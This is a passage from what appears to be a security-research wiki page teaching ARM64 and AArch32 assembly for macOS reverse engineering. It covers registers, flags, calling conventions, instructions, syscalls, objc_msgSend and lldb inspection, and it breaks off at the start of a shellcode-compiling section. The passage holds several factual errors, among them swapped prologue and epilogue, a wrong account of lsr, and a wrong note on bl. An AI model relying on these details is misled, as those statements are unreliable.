  \ (ARM64v8)**\n\nIn ARMv8 architecture, execution levels, known as Exception Levels (ELs), define the privilege level and\
  \ capabilities of the execution environment. There are four exception levels, ranging from EL0 to EL3, each serving a different\
  \ purpose:\n\n1. **EL0 - User Mode**:\n   - This is the least-privileged level and is used for executing regular application\
  \ code.\n   - Applications running at EL0 are isolated from each other and from the system software, enhancing security\
  \ and stability.\n2. **EL1 - Operating System Kernel Mode**:\n   - Most operating system kernels run at this level.\n  \
  \ - EL1 has more privileges than EL0 and can access system resources, but with some restrictions to ensure system integrity.\
  \ You go from EL0 to EL1 with the SVC instruction.\n3. **EL2 - Hypervisor Mode**:\n   - This level is used for virtualization.\
  \ A hypervisor running at EL2 can manage multiple operating systems (each in its own EL1) running on the same physical hardware.\n\
  \   - EL2 provides features for isolation and control of the virtualized environments.\n   - So virtual machine applications\
  \ like Parallels can use the `hypervisor.framework` to interact with EL2 and run virtual machines without needing kernel\
  \ extensions.\n   - TO move from EL1 to EL2 the `HVC` instruction is used.\n4. **EL3 - Secure Monitor Mode**:\n   - This\
  \ is the most privileged level and is often used for secure booting and trusted execution environments.\n   - EL3 can manage\
  \ and control accesses between secure and non-secure states (such as secure boot, trusted OS, etc.).\n   - It was use for\
  \ KPP (Kernel Patch Protection) in macOS, but it's not used anymore.\n   - EL3 is not used anymore by Apple.\n    - The\
  \ transition to EL3 is typically done using the `SMC` (Secure Monitor Call) instruction.\n\nThe use of these levels allows\
  \ for a structured and secure way to manage different aspects of the system, from user applications to the most privileged\
  \ system software. ARMv8's approach to privilege levels helps in effectively isolating different system components, thereby\
  \ enhancing the security and robustness of the system.\n\n## **Registers (ARM64v8)**\n\nARM64 has **31 general-purpose registers**,\
  \ labeled `x0` through `x30`. Each can store a **64-bit** (8-byte) value. For operations that require only 32-bit values,\
  \ the same registers can be accessed in a 32-bit mode using the names w0 through w30.\n\n1. **`x0`** to **`x7`** - These\
  \ are typically used as scratch registers and for passing parameters to subroutines.\n   - **`x0`** also carries the return\
  \ data of a function\n2. **`x8`** - In the Linux kernel, `x8` is used as the system call number for the `svc` instruction.\
  \ **In macOS the x16 is the one used!**\n3. **`x9`** to **`x15`** - More temporary registers, often used for local variables.\n\
  4. **`x16`** and **`x17`** - **Intra-procedural Call Registers**. Temporary registers for immediate values. They are also\
  \ used for indirect function calls and PLT (Procedure Linkage Table) stubs.\n   - **`x16`** is used as the **system call\
  \ number** for the **`svc`** instruction in **macOS**.\n5. **`x18`** - **Platform register**. It can be used as a general-purpose\
  \ register, but on some platforms, this register is reserved for platform-specific uses: Pointer to current thread environment\
  \ block in Windows, or to point to the currently **executing task structure in linux kernel**.\n6. **`x19`** to **`x28`**\
  \ - These are callee-saved registers. A function must preserve these registers' values for its caller, so they are stored\
  \ in the stack and recovered before going back to the caller.\n7. **`x29`** - **Frame pointer** to keep track of the stack\
  \ frame. When a new stack frame is created because a function is called, the **`x29`** register is **stored in the stack**\
  \ and the **new** frame pointer address is (**`sp`** address) is **stored in this registry**.\n   - This register can also\
  \ be used as a **general-purpose registry** although it's usually used as reference to **local variables**.\n8. **`x30`**\
  \ or **`lr`**- **Link register** . It holds the **return address** when a `BL` (Branch with Link) or `BLR` (Branch with\
  \ Link to Register) instruction is executed by storing the **`pc`** value in this register.\n   - It could also be used\
  \ like any other register.\n   - If the current function is going to call a new function and therefore overwrite `lr`, it\
  \ will store it in the stack at the beginning, this is the epilogue (`stp x29, x30 , [sp, #-48]; mov x29, sp` -> Store `fp`\
  \ and `lr`, generate space and get new `fp`) and recover it at the end, this is the prologue (`ldp x29, x30, [sp], #48;\
  \ ret` -> Recover `fp` and `lr` and return).\n9. **`sp`** - **Stack pointer**, used to keep track of the top of the stack.\n\
  \   - the **`sp`** value should always be kept to at least a **quadword** **alignment** or a alignment exception may occur.\n\
  10. **`pc`** - **Program counter**, which points to the next instruction. This register can only be updates through exception\
  \ generations, exception returns, and branches. The only ordinary instructions that can read this register are branch with\
  \ link instructions (BL, BLR) to store the **`pc`** address in **`lr`** (Link Register).\n11. **`xzr`** - **Zero register**.\
  \ Also called **`wzr`** in it **32**-bit register form. Can be used to get the zero value easily (common operation) or to\
  \ perform comparisons using **`subs`** like **`subs XZR, Xn, #10`** storing the resulting data nowhere (in **`xzr`**).\n\
  \nThe **`Wn`** registers are the **32bit** version of the **`Xn`** register.\n\n> [!TIP]\n> The registers from X0 - X18\
  \ are volatile, which means that their values can be changed by function calls and interrupts. However, the registers from\
  \ X19 - X28 are non-volatile, meaning their values must be preserved across function calls (\"callee saved\").\n\n### SIMD\
  \ and Floating-Point Registers\n\nMoreover, there are another **32 registers of 128bit length** that can be used in optimized\
  \ single instruction multiple data (SIMD) operations and for performing floating-point arithmetic. These are called the\
  \ Vn registers although they can also operate in **64**-bit, **32**-bit, **16**-bit and **8**-bit and then they are called\
  \ **`Qn`**, **`Dn`**, **`Sn`**, **`Hn`** and **`Bn`**.\n\n### System Registers\n\n**There are hundreds of system registers**,\
  \ also called special-purpose registers (SPRs), are used for **monitoring** and **controlling** **processors** behaviour.\\\
  \nThey can only be read or set using the dedicated special instruction **`mrs`** and **`msr`**.\n\nThe special registers\
  \ **`TPIDR_EL0`** and **`TPIDDR_EL0`** are commonly found when reversing engineering. The `EL0` suffix indicates the **minimal\
  \ exception** from which the register can be accessed (in this case EL0 is the regular exception (privilege) level regular\
  \ programs runs with).\\\nThey are often used to store the **base address of the thread-local storage** region of memory.\
  \ Usually the first one is readable and writable for programs running in EL0, but the second can be read from EL0 and written\
  \ from EL1 (like kernel).\n\n- `mrs x0, TPIDR_EL0 ; Read TPIDR_EL0 into x0`\n- `msr TPIDR_EL0, X0 ; Write x0 into TPIDR_EL0`\n\
  \n### **PSTATE**\n\n**PSTATE** contains several process components serialized into the operating-system-visible **`SPSR_ELx`**\
  \ special register, being X the **permission** **level of the triggered** exception (this allows to recover the process\
  \ state when the exception ends).\\\nThese are the accessible fields:\n\n<figure><img src=\"../../../images/image (1196).png\"\
  \ alt=\"\"><figcaption></figcaption></figure>\n\n- The **`N`**, **`Z`**, **`C`** and **`V`** condition flags:\n  - **`N`**\
  \ means the operation yielded a negative result\n  - **`Z`** means the operation yielded zero\n  - **`C`** means the operation\
  \ carried\n  - **`V`** means the operation yielded a signed overflow:\n    - The sum of two positive numbers yields a negative\
  \ result.\n    - The sum of two negative numbers yields a positive result.\n    - In subtraction, when a large negative\
  \ number is subtracted from a smaller positive number (or vice versa), and the result cannot be represented within the range\
  \ of the given bit size.\n    - Obviously the processor doesn't now the operation is signed or not, so it will check C and\
  \ V in the operations and indicate of a carry occurred in case it was signed or unsigned.\n\n> [!WARNING]\n> Not all the\
  \ instructions update these flags. Some like **`CMP`** or **`TST`** do, and others that have an s suffix like **`ADDS`**\
  \ also do it.\n\n- The current **register width (`nRW`) flag**: If the flag holds the value 0, the program will run in the\
  \ AArch64 execution state once resumed.\n- The current **Exception Level** (**`EL`**): A regular program running in EL0\
  \ will have the value 0\n- The **single stepping** flag (**`SS`**): Used by debuggers to single step by setting the SS flag\
  \ to 1 inside **`SPSR_ELx`** through an exception. The program will run a step and issue a single step exception.\n- The\
  \ **illegal exception** state flag (**`IL`**): It's used to mark when a privileged software performs an invalid exception\
  \ level transfer, this flag is set to 1 and the processor triggers an illegal state exception.\n- The **`DAIF`** flags:\
  \ These flags allow a privileged program to selectively mask certain external exceptions.\n  - If **`A`** is 1 it means\
  \ **asynchronous aborts** will be triggered. The **`I`** configures to respond to external hardware **Interrupts Requests**\
  \ (IRQs). and the F is related to **Fast Interrupt Requests** (FIRs).\n- The **stack pointer select** flags (**`SPS`**):\
  \ Privileged programs running in EL1 and above can swap between using their own stack pointer register and the user-model\
  \ one (e.g. between `SP_EL1` and `EL0`). This switching is performed by writing to the **`SPSel`** special register. This\
  \ cannot be done from EL0.\n\n## **Calling Convention (ARM64v8)**\n\nThe ARM64 calling convention specifies that the **first\
  \ eight parameters** to a function are passed in registers **`x0` through `x7`**. **Additional** parameters are passed on\
  \ the **stack**. The **return** value is passed back in register **`x0`**, or in **`x1`** as well **if its 128 bits long**.\
  \ The **`x19`** to **`x30`** and **`sp`** registers must be **preserved** across function calls.\n\nWhen reading a function\
  \ in assembly, look for the **function prologue and epilogue**. The **prologue** usually involves **saving the frame pointer\
  \ (`x29`)**, **setting** up a **new frame pointer**, and a**llocating stack space**. The **epilogue** usually involves **restoring\
  \ the saved frame pointer** and **returning** from the function.\n\n### Calling Convention in Swift\n\nSwift have its own\
  \ **calling convention** that can be found in [**https://github.com/apple/swift/blob/main/docs/ABI/CallConvSummary.rst#arm64**](https://github.com/apple/swift/blob/main/docs/ABI/CallConvSummary.rst#arm64)\n\
  \n## **Common Instructions (ARM64v8)**\n\nARM64 instructions generally have the **format `opcode dst, src1, src2`**, where\
  \ **`opcode`** is the **operation** to be performed (such as `add`, `sub`, `mov`, etc.), **`dst`** is the **destination**\
  \ register where the result will be stored, and **`src1`** and **`src2`** are the **source** registers. Immediate values\
  \ can also be used in place of source registers.\n\n- **`mov`**: **Move** a value from one **register** to another.\n  -\
  \ Example: `mov x0, x1` — This moves the value from `x1` to `x0`.\n- **`ldr`**: **Load** a value from **memory** into a\
  \ **register**.\n  - Example: `ldr x0, [x1]` — This loads a value from the memory location pointed to by `x1` into `x0`.\n\
  \  - **Offset mode**: An offset affecting the orin pointer is indicated, for example:\n    - `ldr x2, [x1, #8]`, this will\
  \ load in x2 the value from x1 + 8\n    - `ldr x2, [x0, x1, lsl #2]`, this will load in x2 an object from the array x0,\
  \ from the position x1 (index) \\* 4\n  - **Pre-indexed mode**: This will apply calculations to the origin, get the result\
  \ and also store the new origin in the origin.\n    - `ldr x2, [x1, #8]!`, this will load `x1 + 8` in `x2` and store in\
  \ x1 the result of `x1 + 8`\n    - `str lr, [sp, #-4]!`, Store the link register in sp and update the register sp\n  - **Post-index\
  \ mode**: This is like the previous one but the memory address is accessed and then the offset is calculated and stored.\n\
  \    - `ldr x0, [x1], #8`, load `x1` in `x0` and update x1 with `x1 + 8`\n  - **PC-relative addressing**: In this case the\
  \ address to load is calculated relative to the PC register\n    - `ldr x1, =_start`, This will load the address where the\
  \ `_start` symbol starts in x1 related to the current PC.\n- **`str`**: **Store** a value from a **register** into **memory**.\n\
  \  - Example: `str x0, [x1]` — This stores the value in `x0` into the memory location pointed to by `x1`.\n- **`ldp`**:\
  \ **Load Pair of Registers**. This instruction **loads two registers** from **consecutive memory** locations. The memory\
  \ address is typically formed by adding an offset to the value in another register.\n  - Example: `ldp x0, x1, [x2]` — This\
  \ loads `x0` and `x1` from the memory locations at `x2` and `x2 + 8`, respectively.\n- **`stp`**: **Store Pair of Registers**.\
  \ This instruction **stores two registers** to **consecutive memory** locations. The memory address is typically formed\
  \ by adding an offset to the value in another register.\n  - Example: `stp x0, x1, [sp]` — This stores `x0` and `x1` to\
  \ the memory locations at `sp` and `sp + 8`, respectively.\n  - `stp x0, x1, [sp, #16]!` — This stores `x0` and `x1` to\
  \ the memory locations at `sp+16` and `sp + 24`, respectively, and updates `sp` with `sp+16`.\n- **`add`**: **Add** the\
  \ values of two registers and store the result in a register.\n  - Syntax: add(s) Xn1, Xn2, Xn3 | #imm, \\[shift #N | RRX]\n\
  \    - Xn1 -> Destination\n    - Xn2 -> Operand 1\n    - Xn3 | #imm -> Operando 2 (register or immediate)\n    - \\[shift\
  \ #N | RRX] -> Perform a shift or call RRX\n  - Example: `add x0, x1, x2` — This adds the values in `x1` and `x2` together\
  \ and stores the result in `x0`.\n  - `add x5, x5, #1, lsl #12` — This equals to 4096 (a 1 shifter 12 times) -> 1 0000 0000\
  \ 0000 0000\n  - **`adds`** This perform an `add` and updates the flags\n- **`sub`**: **Subtract** the values of two registers\
  \ and store the result in a register.\n  - Check **`add`** **syntax**.\n  - Example: `sub x0, x1, x2` — This subtracts the\
  \ value in `x2` from `x1` and stores the result in `x0`.\n  - **`subs`** This is like sub but updating the flag\n- **`mul`**:\
  \ **Multiply** the values of **two registers** and store the result in a register.\n  - Example: `mul x0, x1, x2` — This\
  \ multiplies the values in `x1` and `x2` and stores the result in `x0`.\n- **`div`**: **Divide** the value of one register\
  \ by another and store the result in a register.\n  - Example: `div x0, x1, x2` — This divides the value in `x1` by `x2`\
  \ and stores the result in `x0`.\n- **`lsl`**, **`lsr`**, **`asr`**, **`ror`, `rrx`**:\n  - **Logical shift left**: Add\
  \ 0s from the end moving the other bits forward (multiply by n-times 2)\n  - **Logical shift right**: Add 1s at the beginning\
  \ moving the other bits backward (divide by n-times 2 in unsigned)\n  - **Arithmetic shift right**: Like **`lsr`**, but\
  \ instead of adding 0s if the most significant bit is a 1, **1s are added (**divide by ntimes 2 in signed)\n  - **Rotate\
  \ right**: Like **`lsr`** but whatever is removed from the right it's appended to the left\n  - **Rotate Right with Extend**:\
  \ Like **`ror`**, but with the carry flag as the \"most significant bit\". So the carry flag is moved to the bit 31 and\
  \ the removed bit to the carry flag.\n- **`bfm`**: **Bit Filed Move**, these operations **copy bits `0...n`** from a value\
  \ an place them in positions **`m..m+n`**. The **`#s`** specifies the **leftmost bit** position and **`#r`** the **rotate\
  \ right amount**.\n  - Bitfiled move: `BFM Xd, Xn, #r`\n  - Signed Bitfield move: `SBFM Xd, Xn, #r, #s`\n  - Unsigned Bitfield\
  \ move: `UBFM Xd, Xn, #r, #s`\n- **Bitfield Extract and Insert:** Copy a bitfield from a register and copies it to another\
  \ register.\n  - **`BFI X1, X2, #3, #4`** Insert 4 bits from X2 from the 3rd bit of X1\n  - **`BFXIL X1, X2, #3, #4`** Extract\
  \ from the 3rd bit of X2 four bits and copy them to X1\n  - **`SBFIZ X1, X2, #3, #4`** Sign-extends 4 bits from X2 and inserts\
  \ them into X1 starting at bit position 3 zeroing the right bits\n  - **`SBFX X1, X2, #3, #4`** Extracts 4 bits starting\
  \ at bit 3 from X2, sign extends them, and places the result in X1\n  - **`UBFIZ X1, X2, #3, #4`** Zero-extends 4 bits from\
  \ X2 and inserts them into X1 starting at bit position 3 zeroing the right bits\n  - **`UBFX X1, X2, #3, #4`** Extracts\
  \ 4 bits starting at bit 3 from X2 and places the zero-extended result in X1.\n- **Sign Extend To X:** Extends the sign\
  \ (or adds just 0s in the unsigned version) of a value to be able to perform operations with it:\n  - **`SXTB X1, W2`**\
  \ Extends the sign of a byte **from W2 to X1** (`W2` is half of `X2`) to fill the 64bits\n  - **`SXTH X1, W2`** Extends\
  \ the sign of a 16bit number **from W2 to X1** to fill the 64bits\n  - **`SXTW X1, W2`** Extends the sign of a byte **from\
  \ W2 to X1** to fill the 64bits\n  - **`UXTB X1, W2`** Adds 0s (unsigned) to a byte **from W2 to X1** to fill the 64bits\n\
  - **`extr`:** Extracts bits from a specified **pair of registers concatenated**.\n  - Example: `EXTR W3, W2, W1, #3` This\
  \ will **concat W1+W2** and get **from bit 3 of W2 up to bit 3 of W1** and store it in W3.\n- **`cmp`**: **Compare** two\
  \ registers and set condition flags. It's an **alias of `subs`** setting the destination register to the zero register.\
  \ Useful to know if `m == n`.\n  - It supports the **same syntax as `subs`**\n  - Example: `cmp x0, x1` — This compares\
  \ the values in `x0` and `x1` and sets the condition flags accordingly.\n- **`cmn`**: **Compare negative** operand. In this\
  \ case it's an **alias of `adds`** and supports the same syntax. Useful to know if `m == -n`.\n- **`ccmp`**: Conditional\
  \ comparison, it's a comparison that will be performed only if a previous comparison was true and will specifically set\
  \ nzcv bits.\n  - `cmp x1, x2; ccmp x3, x4, 0, NE; blt _func` -> if x1 != x2 and x3 < x4, jump to func\n    - This is because\
  \ **`ccmp`** will only be executed if the **previous `cmp` was a `NE`**, if it wasn't the bits `nzcv` will be set to 0 (which\
  \ won't satisfy the `blt` comparison).\n    - This ca also be used as `ccmn` (same but negative, like `cmp` vs `cmn`).\n\
  - **`tst`**: It checks if any of the values of the comparison are both 1 (it works like and ANDS without storing the result\
  \ anywhere). It's useful to check a registry with a value and check if any of the bits of the registry indicated in the\
  \ value is 1.\n  - Example: `tst X1, #7` Check if any of the last 3 bits of X1 is 1\n- **`teq`**: XOR operation discarding\
  \ the result\n- **`b`**: Unconditional Branch\n  - Example: `b myFunction`\n  - Note that this won't fill the link register\
  \ with the return address (not suitable for subrutine calls that needs to return back)\n- **`bl`**: **Branch** with link,\
  \ used to **call** a **subroutine**. Stores the **return address in `x30`**.\n  - Example: `bl myFunction` — This calls\
  \ the function `myFunction` and stores the return address in `x30`.\n  - Note that this won't fill the link register with\
  \ the return address (not suitable for subrutine calls that needs to return back)\n- **`blr`**: **Branch** with Link to\
  \ Register, used to **call** a **subroutine** where the target is **specified** in a **register**. Stores the return address\
  \ in `x30`. (This is\n  - Example: `blr x1` — This calls the function whose address is contained in `x1` and stores the\
  \ return address in `x30`.\n- **`ret`**: **Return** from **subroutine**, typically using the address in **`x30`**.\n  -\
  \ Example: `ret` — This returns from the current subroutine using the return address in `x30`.\n- **`b.<cond>`**: Conditional\
  \ branches\n  - **`b.eq`**: **Branch if equal**, based on the previous `cmp` instruction.\n    - Example: `b.eq label` —\
  \ If the previous `cmp` instruction found two equal values, this jumps to `label`.\n  - **`b.ne`**: **Branch if Not Equal**.\
  \ This instruction checks the condition flags (which were set by a previous comparison instruction), and if the compared\
  \ values were not equal, it branches to a label or address.\n    - Example: After a `cmp x0, x1` instruction, `b.ne label`\
  \ — If the values in `x0` and `x1` were not equal, this jumps to `label`.\n- **`cbz`**: **Compare and Branch on Zero**.\
  \ This instruction compares a register with zero, and if they are equal, it branches to a label or address.\n  - Example:\
  \ `cbz x0, label` — If the value in `x0` is zero, this jumps to `label`.\n- **`cbnz`**: **Compare and Branch on Non-Zero**.\
  \ This instruction compares a register with zero, and if they are not equal, it branches to a label or address.\n  - Example:\
  \ `cbnz x0, label` — If the value in `x0` is non-zero, this jumps to `label`.\n- **`tbnz`**: Test bit and branch on nonzero\n\
  \  - Example: `tbnz x0, #8, label`\n- **`tbz`**: Test bit and branch on zero\n  - Example: `tbz x0, #8, label`\n- **Conditional\
  \ select operations**: These are operations whose behaviour varies depending on the conditional bits.\n  - `csel Xd, Xn,\
  \ Xm, cond` -> `csel X0, X1, X2, EQ` -> If true, X0 = X1, if false, X0 = X2\n  - `csinc Xd, Xn, Xm, cond` -> If true, Xd\
  \ = Xn, if false, Xd = Xm + 1\n  - `cinc Xd, Xn, cond` -> If true, Xd = Xn + 1, if false, Xd = Xn\n  - `csinv Xd, Xn, Xm,\
  \ cond` -> If true, Xd = Xn, if false, Xd = NOT(Xm)\n  - `cinv Xd, Xn, cond` -> If true, Xd = NOT(Xn), if false, Xd = Xn\n\
  \  - `csneg Xd, Xn, Xm, cond` -> If true, Xd = Xn, if false, Xd = - Xm\n  - `cneg Xd, Xn, cond` -> If true, Xd = - Xn, if\
  \ false, Xd = Xn\n  - `cset Xd, Xn, Xm, cond` -> If true, Xd = 1, if false, Xd = 0\n  - `csetm Xd, Xn, Xm, cond` -> If true,\
  \ Xd = \\<all 1>, if false, Xd = 0\n- **`adrp`**: Compute the **page address of a symbol** and store it in a register.\n\
  \  - Example: `adrp x0, symbol` — This computes the page address of `symbol` and stores it in `x0`.\n- **`ldrsw`**: **Load**\
  \ a signed **32-bit** value from memory and **sign-extend it to 64** bits. This is used for common SWITCH cases.\n  - Example:\
  \ `ldrsw x0, [x1]` — This loads a signed 32-bit value from the memory location pointed to by `x1`, sign-extends it to 64\
  \ bits, and stores it in `x0`.\n- **`stur`**: **Store a register value to a memory location**, using an offset from another\
  \ register.\n  - Example: `stur x0, [x1, #4]` — This stores the value in `x0` into the memory ddress that is 4 bytes greater\
  \ than the address currently in `x1`.\n- **`svc`** : Make a **system call**. It stands for \"Supervisor Call\". When the\
  \ processor executes this instruction, it **switches from user mode to kernel mode** and jumps to a specific location in\
  \ memory where the **kernel's system call handling** code is located.\n\n  - Example:\n\n    ```armasm\n    mov x8, 93 \
  \ ; Load the system call number for exit (93) into register x8.\n    mov x0, 0   ; Load the exit status code (0) into register\
  \ x0.\n    svc 0       ; Make the system call.\n    ```\n\n### **Function Prologue**\n\n1. **Save the link register and\
  \ frame pointer to the stack**:\n\n```armasm\nstp x29, x30, [sp, #-16]!  ; store pair x29 and x30 to the stack and decrement\
  \ the stack pointer\n```\n\n2. **Set up the new frame pointer**: `mov x29, sp` (sets up the new frame pointer for the current\
  \ function)\n3. **Allocate space on the stack for local variables** (if needed): `sub sp, sp, <size>` (where `<size>` is\
  \ the number of bytes needed)\n\n### **Function Epilogue**\n\n1. **Deallocate local variables (if any were allocated)**:\
  \ `add sp, sp, <size>`\n2. **Restore the link register and frame pointer**:\n\n```armasm\nldp x29, x30, [sp], #16  ; load\
  \ pair x29 and x30 from the stack and increment the stack pointer\n```\n\n3. **Return**: `ret` (returns control to the caller\
  \ using the address in the link register)\n\n## ARM Common Memory Protections\n\n{{#ref}}\n../../../binary-exploitation/ios-exploiting/README.md\n\
  {{#endref}}\n\n## AARCH32 Execution State\n\nArmv8-A support the execution of 32-bit programs. **AArch32** can run in one\
  \ of **two instruction sets**: **`A32`** and **`T32`** and can switch between them via **`interworking`**.\\\n**Privileged**\
  \ 64-bit programs can schedule the **execution of 32-bit** programs by executing a exception level transfer to the lower\
  \ privileged 32-bit.\\\nNote that the transition from 64-bit to 32-bit occurs with a lower of the exception level (for example\
  \ a 64-bit program in EL1 triggering a program in EL0). This is done by setting the **bit 4 of** **`SPSR_ELx`** special\
  \ register **to 1** when the `AArch32` process thread is ready to be executed and the rest of `SPSR_ELx` stores the **`AArch32`**\
  \ programs CPSR. Then, the privileged process calls the **`ERET`** instruction so the processor transitions to **`AArch32`**\
  \ entering in A32 or T32 depending on CPSR**.**\n\nThe **`interworking`** occurs using the J and T bits of CPSR. `J=0` and\
  \ `T=0` means **`A32`** and `J=0` and `T=1` means **T32**. This basically traduces on setting the **lowest bit to 1** to\
  \ indicate the instruction set is T32.\\\nThis is set during the **interworking branch instructions,** but can also be set\
  \ directly with other instructions when the PC is set as the destination register. Example:\n\nAnother example:\n\n```armasm\n\
  _start:\n.code 32                ; Begin using A32\n    add r4, pc, #1      ; Here PC is already pointing to \"mov r0, #0\"\
  \n    bx r4               ; Swap to T32 mode: Jump to \"mov r0, #0\" + 1 (so T32)\n\n.code 16:\n    mov r0, #0\n    mov\
  \ r0, #8\n```\n\n### Registers\n\nThere are 16 32-bit registers (r0-r15). **From r0 to r14** they can be used for **any\
  \ operation**, however some of them are usually reserved:\n\n- **`r15`**: Program counter (always). Contains the address\
  \ of the next instruction. In A32 current + 8, in T32, current + 4.\n- **`r11`**: Frame Pointer\n- **`r12`**: Intra-procedural\
  \ call register\n- **`r13`**: Stack Pointer (Note the stack is always 16-byte aligned)\n- **`r14`**: Link Register\n\nMoreover,\
  \ registers are backed up in **`banked registries`**. Which are places that store the registers values allowing to perform\
  \ **fast context switching** in exception handling and privileged operations to avoid the need to manually save and restore\
  \ registers every time.\\\nThis is done by **saving the processor state from the `CPSR` to the `SPSR`** of the processor\
  \ mode to which the exception is taken. On the exception returns, the **`CPSR`** is restored from the **`SPSR`**.\n\n###\
  \ CPSR - Current Program Status Register\n\nIn AArch32 the CPSR works similar to **`PSTATE`** in AArch64 and is also stored\
  \ in **`SPSR_ELx`** when a exception is taken to restore later the execution:\n\n<figure><img src=\"../../../images/image\
  \ (1197).png\" alt=\"\"><figcaption></figcaption></figure>\n\nThe fields are divided in some groups:\n\n- Application Program\
  \ Status Register (APSR): Arithmetic flags and accesible from EL0\n- Execution State Registers: Process behaviour (managed\
  \ by the OS).\n\n#### Application Program Status Register (APSR)\n\n- The **`N`**, **`Z`**, **`C`**, **`V`** flags (just\
  \ like in AArch64)\n- The **`Q`** flag: It's set to 1 whenever **integer saturation occurs** during the execution of a specialized\
  \ saturating arithmetic instruction. Once it's set to **`1`**, it'll maintain the value until it's manually set to 0. Moreover,\
  \ there isn't any instruction that checks its value implicitly, it must be done reading it manually.\n- **`GE`** (Greater\
  \ than or equal) Flags: It's used in SIMD (Single Instruction, Multiple Data) operations, such as \"parallel add\" and \"\
  parallel subtract\". These operations allow processing multiple data points in a single instruction.\n\n  For example, the\
  \ **`UADD8`** instruction **adds four pairs of bytes** (from two 32-bit operands) in parallel and stores the results in\
  \ a 32-bit register. It then **sets the `GE` flags in the `APSR`** based on these results. Each GE flag corresponds to one\
  \ of the byte additions, indicating if the addition for that byte pair **overflowed**.\n\n  The **`SEL`** instruction uses\
  \ these GE flags to perform conditional actions.\n\n#### Execution State Registers\n\n- The **`J`** and **`T`** bits: **`J`**\
  \ should be 0 and if **`T`** is 0 the instruction set A32 is used, and if it's 1, the T32 is used.\n- **IT Block State Register**\
  \ (`ITSTATE`): These are the bits from 10-15 and 25-26. They store conditions for instructions inside an **`IT`** prefixed\
  \ group.\n- **`E`** bit: Indicates the **endianness**.\n- **Mode and Exception Mask Bits** (0-4): They determine the current\
  \ execution state. The **5th** one indicates if the program runs as 32bit (a 1) or 64bit (a 0). The other 4 represents the\
  \ **exception mode currently in used** (when a exception occurs and it's being handled). The number set **indicates the\
  \ current priority** in case another exception is triggered while this is being handled.\n\n<figure><img src=\"../../../images/image\
  \ (1200).png\" alt=\"\"><figcaption></figcaption></figure>\n\n- **`AIF`**: Certain exceptions can be disabled using the\
  \ bits **`A`**, `I`, `F`. If **`A`** is 1 it means **asynchronous aborts** will be triggered. The **`I`** configures to\
  \ respond to external hardware **Interrupts Requests** (IRQs). and the F is related to **Fast Interrupt Requests** (FIRs).\n\
  \n## macOS\n\n### BSD syscalls\n\nCheck out [**syscalls.master**](https://opensource.apple.com/source/xnu/xnu-1504.3.12/bsd/kern/syscalls.master)\
  \ or run `cat /Library/Developer/CommandLineTools/SDKs/MacOSX.sdk/usr/include/sys/syscall.h`. BSD syscalls will have **x16\
  \ > 0**.\n\n### Mach Traps\n\nCheck out in [**syscall_sw.c**](https://opensource.apple.com/source/xnu/xnu-3789.1.32/osfmk/kern/syscall_sw.c.auto.html)\
  \ the `mach_trap_table` and in [**mach_traps.h**](https://opensource.apple.com/source/xnu/xnu-3789.1.32/osfmk/mach/mach_traps.h)\
  \ the prototypes. The mex number of Mach traps is `MACH_TRAP_TABLE_COUNT` = 128. Mach traps will have **x16 < 0**, so you\
  \ need to call the numbers from the previous list with a **minus**: **`_kernelrpc_mach_vm_allocate_trap`** is **`-10`**.\n\
  \nYou can also check **`libsystem_kernel.dylib`** in a disassembler to find how to call these (and BSD) syscalls:\n\n```bash\n\
  # macOS\ndyldex -e libsystem_kernel.dylib /System/Volumes/Preboot/Cryptexes/OS/System/Library/dyld/dyld_shared_cache_arm64e\n\
  \n# iOS\ndyldex -e libsystem_kernel.dylib /System/Library/Caches/com.apple.dyld/dyld_shared_cache_arm64\n```\n\nNote that\
  \ **Ida** and **Ghidra** can also decompile **specific dylibs** from the cache just by passing the cache.\n\n> [!TIP]\n\
  > Sometimes it's easier to check the **decompiled** code from **`libsystem_kernel.dylib`** **than** checking the **source\
  \ code** because the code of several syscalls (BSD and Mach) are generated via scripts (check comments in the source code)\
  \ while in the dylib you can find what is being called.\n\n### machdep calls\n\nXNU supports another type of calls called\
  \ machine dependent. The numbers of these calls depends on the architecture and neither the calls or numbers are guaranteed\
  \ to remain constant.\n\n### comm page\n\nThis is a kernel owner memory page that is mapped into the address scape of every\
  \ users process. It's meant to make the transition from user mode to kernel space faster than using syscalls for kernel\
  \ services that are used so much the this transition would be vey inneficient.\n\nFor example the call `gettimeofdate` reads\
  \ the value of `timeval` directly from the comm page.\n\n### objc_msgSend\n\nIt's super common to find this function used\
  \ in Objective-C or Swift programs. This function allows to call a method of an objective-C object.\n\nParameters ([more\
  \ info in the docs](https://developer.apple.com/documentation/objectivec/1456712-objc_msgsend)):\n\n- x0: self -> Pointer\
  \ to the instance\n- x1: op -> Selector of the method\n- x2... -> Rest of the arguments of the invoked method\n\nSo, if\
  \ you put breakpoint before the branch to this function, you can easily find what is invoked in lldb with (in this example\
  \ the object calls an object from `NSConcreteTask` that will run a command):\n\n```bash\n# Right in the line were objc_msgSend\
  \ will be called\n(lldb) po $x0\n<NSConcreteTask: 0x1052308e0>\n\n(lldb) x/s $x1\n0x1736d3a6e: \"launch\"\n\n(lldb) po [$x0\
  \ launchPath]\n/bin/sh\n\n(lldb) po [$x0 arguments]\n<__NSArrayI 0x1736801e0>(\n-c,\nwhoami\n)\n```\n\n> [!TIP]\n> Setting\
  \ the env variable **`NSObjCMessageLoggingEnabled=1`** it's possible to log when this function is called in a file like\
  \ `/tmp/msgSends-pid`.\n>\n> Moreover, setting **`OBJC_HELP=1`** and calling any binary you can see other environment variables\
  \ you could use to **log** when certain Objc-C actions occurs.\n\nWhen this function is called, it's needed to find the\
  \ called method of the indicated instance, for this different searches are made:\n\n- Perform optimistic cache lookup:\n\
  \  - If successful, done\n- Acquire runtimeLock (read)\n  - If (realize && !cls->realized) realize class\n  - If (initialize\
  \ && !cls->initialized) initialize class\n- Try class own cache:\n  - If successful, done\n- Try class method list:\n  -\
  \ If found, fill cache and done\n- Try superclass cache:\n  - If successful, done\n- Try superclass method list:\n  - If\
  \ found, fill cache and done\n- If (resolver) try method resolver, and repeat from class lookup\n- If still here (= all\
  \ else has failed) try forwarder\n\n### Shellcodes\n\nTo compile:\n\n```bash\nas -o shell.o shell.s\nld -o shell shell.o\
  \ -macosx_version_min 13.0 -lSystem -L /Library/Developer/CommandLineTools/SDKs/MacOSX.sdk/usr/lib\n\n# You could also use\
